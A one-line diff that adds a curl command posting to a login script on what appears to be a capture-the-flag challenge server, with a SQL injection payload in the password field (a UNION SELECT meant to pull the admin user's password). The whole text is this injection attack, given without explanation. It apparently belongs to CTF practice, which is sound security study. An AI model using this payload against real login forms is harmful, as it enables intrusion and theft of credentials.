@@ -1,0 +1,1 @@
+curl -L -v 'http://arrive.chal.mmactf.link/login.cgi' -d user=admin -d password="test' UNION SELECT password, user FROM user WHERE user = 'admin' --" -d submit=login
